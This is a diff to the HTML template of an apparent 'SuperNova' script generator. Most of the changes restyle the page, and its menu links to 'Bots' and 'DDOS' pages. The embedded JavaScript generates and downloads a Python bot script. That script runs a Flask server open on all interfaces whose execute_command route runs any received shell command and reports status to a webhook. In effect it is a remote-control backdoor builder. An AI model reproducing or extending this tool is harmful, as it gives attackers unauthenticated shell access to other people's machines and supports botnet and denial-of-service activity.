@@ -3,118 +3,169 @@
 <head>
     <!-- Favicon -->
     <link rel="icon" href="{{ url_for('static', filename='icon.png') }}" type="image/png">
-
+    
     <!-- Character Set and Viewport -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+    
     <title>SuperNova - Script Generator</title>
-
+    
     <!-- jQuery -->
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-
+    
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-
+    
     <style>
         body {
+            background: linear-gradient(to bottom right, #1e3a8a, #6366f1); /* Deep blue to purple gradient */
+            color: #d1e8ff; /* Light blue text color */
             font-family: 'Poppins', sans-serif;
-            background-color: #f4f4f4;
             padding: 20px;
-            position: relative;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         h1 {
-            color: #333;
+            font-size: 50px;
+            animation: rotate-scale-color 3s infinite ease-in-out;
+            color: white; /* Keep h1 white */
+            text-shadow: 0 0 10px #87CEEB, 0 0 20px #87CEEB, 0 0 30px #00076f;
             text-align: center;
-            margin-bottom: 20px;
+        }
+        
+        @keyframes rotate-scale-color {
+            0% {
+                transform: scale(2);
+                color: white;
+                text-shadow: 0 0 10px #87CEEB;
+            }
+            25% {
+                text-shadow: 0 0 10px #9d00ff;
+            }
+            50% {
+                text-shadow: 0 0 10px #87CEEB;
+            }
+            75% {
+                text-shadow: 0 0 10px #9d00ff;
+            }
+            100% {
+                transform: scale(2);
+                text-shadow: 0 0 10px #9d00ff;
+            }
         }
 
-        input[type="text"] {
-            width: 100%;
-            padding: 10px;
+        p {
+            color: #d1e8ff; /* Light blue for paragraphs */
             margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            transition: border-color 0.3s;
         }
 
-        input[type="text"]:focus {
-            border-color: #5cb85c;
-            outline: none;
+        table {
+            margin-top: 20px;
+            border-collapse: collapse;
+            width: 80%;
+            background-color: #1f2937; /* Dark navy for table background */
+        }
+
+        th, td {
+            border: 1px solid #d1e8ff; /* Light blue border */
+            padding: 10px;
+            text-align: left;
+            color: #d1e8ff; /* Light blue text */
+        }
+
+        th {
+            background-color: rgba(99, 102, 241, 0.1); /* Light purple for header */
+        }
+
+        tr:nth-child(even) {
+            background-color: rgba(31, 41, 55, 0.6); /* Dark navy alternating row */
         }
 
         button {
-            padding: 10px 15px;
-            background-color: #5cb85c;
+            background-color: #3b82f6; /* Blue background for buttons */
             color: white;
-            border: none;
-            border-radius: 4px;
+            border: 2px solid #3b82f6;
+            padding: 10px 20px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            font-weight: 600;
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
         }
 
         button:hover {
-            background-color: #4cae4c;
+            background-color: #6366f1; /* Purple on hover */
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(99, 102, 241, 0.7);
         }
 
-        /* Dropdown Styles */
         .dropdown {
-            position: absolute;
-            top: 10px;
-            right: 120px;
-        }
-
-        .dropbtn {
-            background-color: #5cb85c;
-            color: white;
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-        }
-
-        .dropbtn:hover {
-            background-color: #4cae4c;
+            position: relative;
+            display: inline-block;
         }
 
         .dropdown-content {
             display: none;
             position: absolute;
-            background-color: #f9f9f9;
+            background-color: #3b82f6;
             min-width: 160px;
-            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+            box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);
             z-index: 1;
-            border-radius: 4px;
+            border-radius: 8px;
         }
 
         .dropdown-content a {
-            color: black;
+            color: white;
             padding: 12px 16px;
             text-decoration: none;
             display: block;
+            border-radius: 8px;
             transition: background-color 0.3s;
         }
 
         .dropdown-content a:hover {
-            background-color: #f1f1f1;
+            background-color: #6366f1;
         }
 
-        .show {
+        .dropdown:hover .dropdown-content {
             display: block;
         }
 
-        img {
-            width: 100px;
-            height: 100px;
-            position: absolute;
-            top: 10px;
-            right: 10px;
+        .dropbtn {
+            background-color: #3b82f6;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            border-radius: 8px;
+            font-weight: 600;
+        }
+
+        .dropbtn:hover {
+            background-color: #6366f1;
+        }
+
+        form {
+            margin-top: 20px;
+        }
+
+        label {
+            font-size: 18px;
+            margin-right: 10px;
+        }
+
+        input {
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #d1e8ff;
+            background-color: #1f2937;
+            color: #d1e8ff;
         }
     </style>
 </head>
+
 <body>
     <h1>Script Generator</h1>
     <img rel="image" src="{{ url_for('static', filename='icon.png') }}">
@@ -130,8 +181,8 @@
     </form>
 
     <div class="dropdown">
-        <button class="dropbtn" onclick="toggleDropdown()">Options</button>
-        <div id="myDropdown" class="dropdown-content">
+        <button class="dropbtn">Options</button>
+        <div class="dropdown-content">
             <a href="#" onclick="navigateTo('/bots')">Bots</a>
             <a href="#" onclick="navigateTo('/DDOS')">DDOS</a>
             <a href="#" onclick="navigateTo('/status')">Status Codes</a>
@@ -140,27 +191,9 @@
     </div>
 
     <script>
-        // Function to toggle dropdown
-        function toggleDropdown() {
-            document.getElementById("myDropdown").classList.toggle("show");
-        }
-
         // Function to navigate to a new page
         function navigateTo(url) {
-            window.location.href = url; // Redirect to the new URL
-        }
-
-        // Close the dropdown if the user clicks outside of it
-        window.onclick = function(event) {
-            if (!event.target.matches('.dropbtn')) {
-                var dropdowns = document.getElementsByClassName("dropdown-content");
-                for (var i = 0; i < dropdowns.length; i++) {
-                    var openDropdown = dropdowns[i];
-                    if (openDropdown.classList.contains('show')) {
-                        openDropdown.classList.remove('show');
-                    }
-                }
-            }
+            window.location.href = url;
         }
 
         document.getElementById("scriptForm").addEventListener("submit", function(event) {
@@ -183,11 +216,6 @@ import signal
 import sys
 
 app = Flask(__name__)
-
-if platform.system() == 'Linux':
-    os.system("clear")
-else:
-    os.system("cls")
 
 username = "${username}"
 hook_url = "${hook_url}"
@@ -260,49 +288,38 @@ def execute_command():
                 return jsonify({'error': f"No such file or directory: '{new_dir}'"}), 404
             except PermissionError:
                 return jsonify({'error': f"Permission denied: '{new_dir}'"}), 403
-
-        if platform.system() == 'Windows':
-            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, cwd=current_directory)
+        elif command.lower() == "pwd":
+            return jsonify({'result': current_directory})
         else:
-            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
-        
-        output = result.stdout if result.returncode == 0 else result.stderr
-        return jsonify({'result': output})
-    
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
+            result = subprocess.check_output(command, shell=True, cwd=current_directory)
+            return jsonify({'result': result.decode('utf-8')})
+    except subprocess.CalledProcessError as e:
+        return jsonify({'error': f"Error: {e}"}), 500
 
-@app.route('/update_username', methods=['POST'])
-def update_username():
-    global username
-    new_username = request.json.get('username')
-    if new_username:
-        username = new_username
-        return jsonify({"message": "Username updated", "new_username": username}), 200
-    return jsonify({"message": "Username not provided"}), 400
+@app.route('/terminate', methods=['POST'])
+def terminate():
+    hook.send("Shutting down server.")
+    os.kill(os.getpid(), signal.SIGTERM)
+    return jsonify({'message': 'Server is shutting down'})
 
-@app.route('/get_username', methods=['GET'])
-def get_username():
-    return jsonify({"username": username}), 200
-
-def cleanup(signum, frame):
-    hook.send(f"{username} is offline.")
-    ngrok_process.terminate()
+def shutdown_handler(signal, frame):
+    hook.send("Server has shut down.")
     sys.exit(0)
 
-signal.signal(signal.SIGINT, cleanup)
-signal.signal(signal.SIGTERM, cleanup)
+signal.signal(signal.SIGINT, shutdown_handler)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
-`;
+            `;
 
-            const blob = new Blob([scriptContent], { type: 'text/plain' });
-            const link = document.createElement('a');
+            // Create a Blob and trigger download
+            const blob = new Blob([scriptContent], { type: "text/plain;charset=utf-8" });
+            const link = document.createElement("a");
             link.href = URL.createObjectURL(blob);
-            link.download = 'Bot_script.py';
+            link.download = `generated_script_${username}.py`;
             link.click();
         });
     </script>
+
 </body>
 </html>
